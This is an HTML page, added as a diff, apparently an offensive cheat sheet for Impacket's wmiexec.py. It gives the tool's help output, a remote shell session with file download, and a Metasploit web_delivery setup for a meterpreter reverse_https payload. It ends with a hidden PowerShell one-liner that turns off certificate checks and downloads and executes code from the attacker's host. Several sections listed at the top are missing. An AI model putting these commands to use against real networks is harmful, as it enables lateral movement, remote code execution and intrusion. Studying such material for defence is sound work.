@@ -1,0 +1,154 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Attackerkb Reference</title>
+</head><body>Help Output <br/>
+Basic Shell <br/>
+Shell with Hashes <br/>
+Shell with Kerberos <br/>
+Shell with aesKey <br/>
+Web Delivery plus WMIEXEC through a Metasploit socks4a Proxy <br/>
+<br/>
+<b>Help Output </b><br/>
+Impacket v0.9.14-dev - Copyright 2002-2015 Core Security Technologies<br/>
+<br/>
+usage: wmiexec.py [-h] [-share SHARE] [-nooutput] [-debug]<br/>
+         [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key]<br/>
+         target [command [command ...]]<br/>
+<br/>
+Executes a semi-interactive shell using Windows Management Instrumentation.<br/>
+<br/>
+positional arguments:<br/>
+ target        [[domain/]username[:password]@]&lt;targetName or address&gt;<br/>
+ command        command to execute at the target. If empty it will<br/>
+            launch a semi-interactive shell<br/>
+<br/>
+optional arguments:<br/>
+ -h, --help      show this help message and exit<br/>
+ -share SHARE     share where the output will be grabbed from (default<br/>
+            ADMIN$)<br/>
+ -nooutput       whether or not to print the output (no SMB connection<br/>
+            created)<br/>
+ -debug        Turn DEBUG output ON<br/>
+<br/>
+authentication:<br/>
+ -hashes LMHASH:NTHASH<br/>
+            NTLM hashes, format is LMHASH:NTHASH<br/>
+ -no-pass       don't ask for password (useful for -k)<br/>
+ -k          Use Kerberos authentication. Grabs credentials from<br/>
+            ccache file (KRB5CCNAME) based on target parameters.<br/>
+            If valid credentials cannot be found, it will use the<br/>
+            ones specified in the command line<br/>
+ -aesKey hex key    AES key to use for Kerberos Authentication (128 or 256<br/>
+            bits)<br/>
+<br/>
+<b>Getting Shells</b> <br/>
+Getting shells is awesome, but there is a reason why you don't want to just run cmd.exe as the executable to run. Impacket has a special thing it does when you leave the executable off that allows for uploads and downloads, which cmd.exe<br/>
+<b><br/>
+</b><b>Basic Shell</b> <br/>
+The basic shell in wmiexec.py is essentially %COMSPEC% / cmd.exe with one tine difference, you can upload and download directly from it. This holds a lot of weight when you think about the capabilities to authenticate that Impacket has (password/hashes/kerberos).<br/>
+<br/>
+python wmiexec.py administrator@172.16.102.135<br/>
+Impacket v0.9.14-dev - Copyright 2002-2015 Core Security Technologies<br/>
+<br/>
+Password:<br/>
+[*] SMBv2.1 dialect used<br/>
+[!] Launching semi-interactive shell - Careful what you execute<br/>
+[!] Press help for extra shell commands<br/>
+C:\temp&gt;<br/>
+C:\temp&gt;help<br/>
+<br/>
+lcd {path}         - changes the current local directory to {path}<br/>
+exit            - terminates the server process (and this session)<br/>
+put {src_file, dst_path}  - uploads a local file to the dst_path (dst_path = default current directory)<br/>
+get {file}         - downloads pathname to the current local dir<br/>
+! {cmd}          - executes a local shell cmd<br/>
+<br/>
+C:\temp&gt;get test.log<br/>
+[*] Downloading C:\\temp\test.log<br/>
+<br/>
+<b>Web Delivery plus WMIEXEC through a Metasploit socks4a Proxy </b><br/>
+First, we assume that you already have a single shell, one way or another into a corporate network. The internal range used by the network you've gotten a shell on is 172.16.102.0/24 and you are running as an admin.<br/>
+<br/>
+msf exploit(web_delivery) &gt; set SRVPORT 8443<br/>
+SRVPORT =&gt; 8443<br/>
+msf exploit(web_delivery) &gt; set URIPATH /download<br/>
+URIPATH =&gt; /download<br/>
+msf exploit(web_delivery) &gt; set LPORT 8443<br/>
+LPORT =&gt; 8443<br/>
+msf exploit(web_delivery) &gt; set TARGET 2<br/>
+TARGET =&gt; 2<br/>
+msf exploit(web_delivery) &gt; show targets<br/>
+msf exploit(web_delivery) &gt; set PAYLOAD windows/meterpreter/reverse_https<br/>
+PAYLOAD =&gt; windows/meterpreter/reverse_https<br/>
+<br/>
+Exploit targets:<br/>
+<br/>
+ Id Name<br/>
+ -- ----<br/>
+ 0  Python<br/>
+ 1  PHP<br/>
+ 2  PSH<br/>
+<br/>
+<br/>
+msf exploit(web_delivery) &gt; show options<br/>
+<br/>
+Module options (exploit/multi/script/web_delivery):<br/>
+<br/>
+ Name   Current Setting Required Description<br/>
+ ----   --------------- -------- -----------<br/>
+ SRVHOST 0.0.0.0     yes    The local host to listen on. This must be an address on the local machine or 0.0.0.0<br/>
+ SRVPORT 8443       yes    The local port to listen on.<br/>
+ SSL   false      no    Negotiate SSL for incoming connections<br/>
+ SSLCert          no    Path to a custom SSL certificate (default is randomly generated)<br/>
+ URIPATH /download    no    The URI to use for this exploit (default is random)<br/>
+<br/>
+<br/>
+Payload options (windows/meterpreter/reverse_https):<br/>
+<br/>
+ Name   Current Setting Required Description<br/>
+ ----   --------------- -------- -----------<br/>
+ EXITFUNC process     yes    Exit technique (Accepted: , , seh, thread, process, none)<br/>
+ LHOST   172.16.102.1   yes    The listen hostname<br/>
+ LPORT   8443       yes    The listen port<br/>
+<br/>
+<br/>
+Exploit target:<br/>
+<br/>
+ Id Name<br/>
+ -- ----<br/>
+ 2  PSH<br/>
+<br/>
+<br/>
+msf exploit(web_delivery) &gt; set SSL true<br/>
+SSL =&gt; true<br/>
+msf exploit(web_delivery) &gt; exploit -j<br/>
+[*] Exploit running as background job.<br/>
+msf exploit(web_delivery) &gt;<br/>
+[*] Started reverse handler on 172.16.102.1:8443<br/>
+[*] Using URL: https://0.0.0.0:8443/download<br/>
+[*] Local IP: https://192.168.92.105:8443/download<br/>
+[*] Server started.<br/>
+[*] Run the following command on the target machine:<br/>
+powershell.exe -nop -w hidden -c [System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};IEX ((new-object net.webclient).downloadstring('https://172.16.102.1:8443/download'))<br/>
+<br/>
+msf exploit(web_delivery) &gt;<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+</body></html>
